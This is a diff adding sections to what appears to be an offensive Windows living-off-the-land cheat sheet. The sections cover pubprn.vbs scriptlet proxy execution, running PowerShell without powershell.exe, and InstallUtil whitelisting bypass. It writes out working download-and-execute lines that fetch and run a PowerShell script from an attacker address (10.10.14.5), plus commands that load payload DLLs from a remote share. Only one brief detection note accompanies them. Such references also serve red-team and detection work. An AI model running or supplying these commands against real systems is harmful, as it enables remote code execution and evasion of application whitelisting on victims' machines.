@@ -163,6 +163,72 @@ wmic.exe os get /FORMAT:"\\\\attacker\\share\\shell.xsl"
 wmic.exe process call create "C:\Windows\Temp\file.txt:program.exe"
 # MITRE: T1218 | Privilege: User / Admin for remote</code></pre>
 
+  <h3>pubprn.vbs — Signed Script Proxy Execution (T1216)</h3>
+  <p>pubprn.vbs is a Microsoft-signed VBScript in System32 that can load and execute a remote scriptlet file. Because it is a signed script, it bypasses application whitelisting controls that trust Microsoft-signed content.</p>
+  <pre><code># Step 1: Host a scriptlet file on your server (proxy.sct):
+# &lt;?XML version="1.0"?&gt;
+# &lt;scriptlet&gt;
+# &lt;registration progid="Bandit" version="1.00" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"&gt;&lt;/registration&gt;
+# &lt;script language="JScript"&gt;&lt;![CDATA[
+#   var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')");
+# ]]&gt;&lt;/script&gt;
+# &lt;/scriptlet&gt;
+
+# Step 2: Execute via pubprn.vbs:
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://10.10.14.5/proxy.sct
+# /b = batch mode (no user prompts)
+# 127.0.0.1 = printer server arg (ignored, any value works)
+
+# Observations:
+# - calc.exe/payload spawned by cscript.exe which closes immediately (orphan process)
+# - Detection: cscript.exe with "script:" URL in args, network connection to remote host
+# MITRE: T1216 | Privilege: User</code></pre>
+
+  <h3>PowerShell Without powershell.exe (T1059.001)</h3>
+  <p>When powershell.exe is blocked by application whitelisting or monitored, PowerShell can still be executed by hosting the System.Management.Automation.dll in other processes.</p>
+  <pre><code># Method 1: PowerShdll — rundll32 loads PowerShell DLL
+# github.com/p3nt4/PowerShdll
+rundll32.exe PowerShdll.dll,main
+# Or: regsvr32.exe /s PowerShdll.dll
+# Or: regasm.exe /U PowerShdll.dll
+# PowerShdll.exe (compiled binary — more detectable, may hit AWL)
+
+# Method 2: SyncAppvPublishingServer.vbs — inject PowerShell commands
+# Windows 10 built-in signed VBScript:
+SyncAppvPublishingServer.vbs "Break; iwr http://10.10.14.5/s.ps1 | iex"
+SyncAppvPublishingServer.vbs "n; Start-Process calc.exe"
+
+# Method 3: Inline C# in MSBuild (System.Management.Automation reference)
+# See msbuild.exe section above — invoke Powershell via RunspaceFactory
+
+# Method 4: Custom .NET executable or PowerShell runner
+# Compile a .NET binary that references System.Management.Automation.dll
+# and calls RunspaceFactory.CreateRunspace()
+# MITRE: T1059.001 | Privilege: User</code></pre>
+
+  <h3>InstallUtil.exe — Bypass AppWhitelisting (T1218.004)</h3>
+  <pre><code># .NET utility that can load and run custom code from a DLL or EXE
+# Signed by Microsoft — bypasses application whitelisting
+
+# Step 1: Create C# class with [RunInstaller(true)] attribute:
+# public class ShellExec : System.Configuration.Install.Installer {
+#     public override void Uninstall(IDictionary savedState) {
+#         System.Diagnostics.Process.Start("calc.exe");
+#     }
+# }
+
+# Step 2: Compile:
+# csc /target:library shellexec.cs -o: shellexec.dll
+# csc shellexec.cs -o: shellexec.exe
+
+# Step 3: Execute via InstallUtil with /U (uninstall) flag:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shellexec.dll
+# Note: /U triggers Uninstall() method, bypassing code signing checks
+
+# Fileless variant (host on WebDAV):
+InstallUtil.exe /logfile= /LogToConsole=false /U \\10.10.14.5\share\shellexec.dll
+# MITRE: T1218.004 | Privilege: User</code></pre>
+
   <h3>Other Notable Execute Binaries</h3>
   <pre><code># ssh.exe — execute local or remote command (built-in since Win10 1809):
 ssh.exe localhost "whoami /all"
